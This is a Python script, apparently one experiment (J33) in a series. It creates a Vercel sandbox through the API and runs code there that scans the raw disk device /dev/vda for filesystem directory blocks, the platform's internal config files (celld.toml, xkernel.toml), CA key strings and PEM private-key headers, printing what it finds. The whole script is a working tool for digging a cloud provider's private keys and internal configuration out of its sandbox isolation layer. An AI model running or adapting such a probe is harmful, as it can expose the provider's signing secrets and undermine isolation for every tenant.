# 实验J33: 0-160MB 全局搜 - 目录数据块(XDB2/XDDB)解析 + celld.toml 命中点 + PEM 私钥
# 依据: J32 确认块131无短目录; vda 实际 ~130MB (稀疏镜像), 全部有效数据在前 160MB
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=600):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj33"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import re, struct, time

import os

def be16(d, o): return struct.unpack_from(">H", d, o)[0]
def be32(d, o): return struct.unpack_from(">I", d, o)[0]
def be64(d, o): return struct.unpack_from(">Q", d, o)[0]

f = open("/dev/vda", "rb", buffering=0)
try:
    f.seek(0, 2)
    real = f.tell()
    f.seek(0)
except Exception:
    real = -1
print("vda real size:", real, flush=True)

LIMIT = 640 * 1024 * 1024  # 覆盖 J26 首版命中区 512-619MB
CH = 1024 * 1024
PATS = [
    (b"XDB2", "dir2"),
    (b"XDDB", "dir3"),
    (b"celld.toml", "celld-toml"),
    (b"xkernel.toml", "xkernel-toml"),
    (b"ca-cert", "ca-cert"),
    (b"ca-key", "ca-key"),
    (b"BEGIN", "pem-begin"),
    (b"/run/cell", "run-cell"),
    (b"celld.service", "celld-svc"),
]
hits = {t: [] for _, t in PATS}
t0 = time.time()
off = 0
while off < LIMIT:
    f.seek(off)
    d = f.read(CH)
    if not d:
        print("EOF at", off, flush=True)
        break
    for pat, tag in PATS:
        for m in re.finditer(pat, d):
            hits[tag].append(off + m.start())
    off += len(d)
print("scan done %.1fs" % (time.time() - t0), flush=True)
for tag, lst in hits.items():
    uniq = sorted(set(lst))
    print("[%s] %d hits: %s" % (tag, len(uniq), uniq[:30]), flush=True)

def parse_dirblock(blk, bs):
    magic = blk[:4]
    hdr = 28 if magic == b"XDB2" else 64 if magic == b"XDDB" else None
    if hdr is None:
        return None
    out = []
    e = hdr
    while e + 11 <= bs:
        ino = be64(blk, e)
        if ino == 0:
            break
        namelen = blk[e+8]
        if e + 9 + namelen + 2 > bs:
            break
        name = blk[e+9:e+9+namelen].decode(errors="replace")
        out.append((ino, name))
        e += 9 + namelen + 2
    return out

# 解析所有 XDB2/XDDB 目录数据块
print("===== DIR BLOCKS =====", flush=True)
for p in sorted(set(hits["dir2"] + hits["dir3"])):
    blk = (p // 4096) * 4096
    f.seek(blk)
    data = f.read(4096)
    magic = data[:4]
    if magic not in (b"XDB2", b"XDDB"):
        continue
    entries = parse_dirblock(data, 4096)
    print("DIRBLK@%d magic=%s entries=%d" % (blk, magic, len(entries) if entries else -1), flush=True)
    if entries:
        for ino, name in entries:
            print("   ino=%d %r" % (ino, name), flush=True)

# celld.toml 命中点上下文
print("===== celld.toml HIT CONTEXT =====", flush=True)
for p in sorted(set(hits["celld-toml"]))[:20]:
    f.seek(max(0, p - 64))
    ctx = f.read(256)
    print("@%d: %r" % (p, ctx), flush=True)

# PEM 私钥命中点上下文 (找 BEGIN 后的类型)
print("===== PEM HITS =====", flush=True)
for p in sorted(set(hits["pem-begin"])):
    f.seek(p)
    ctx = f.read(48)
    print("@%d: %r" % (p, ctx), flush=True)
'''
run_cmd(sid, SCAN, "globscan", wait=True, timeout=580000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
